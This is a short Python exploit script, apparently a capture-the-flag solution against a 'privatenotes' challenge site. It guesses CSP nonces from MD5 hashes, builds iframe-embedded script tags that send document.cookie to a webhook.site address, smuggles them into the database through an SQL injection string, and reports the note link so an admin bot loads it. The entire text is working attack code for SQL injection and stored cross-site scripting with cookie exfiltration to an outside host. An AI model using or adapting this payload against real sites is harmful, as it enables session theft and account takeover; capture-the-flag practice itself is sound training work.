import requests
from hashlib import md5
from base64 import b64encode

from tomlkit import document

URL = 'http://privatenotes.challs.olicyber.it/'

s = requests.Session()

s.get(URL)

nonces = []

for i in range(11):
    nonces.append(b64encode(md5(str(i).encode()).digest()).decode())

payload = ""
for n in nonces:
    payload += "<iframe srcdoc=\"<script nonce="+n+" >fetch(`https://webhook.site/210d0b1b-0e8a-4ca4-bac0-7f111393f471?${document.cookie}`)</script>\"></iframe>\n"

content = f"'),(100,0,'{payload}') -- -"
print(content)
print(nonces)
r = s.post(URL + 'api/note', json={ "content": content })

r = s.post(URL + 'api/abuse', json={ "link": "http://privatenotes.challs.olicyber.it/notes#100" })
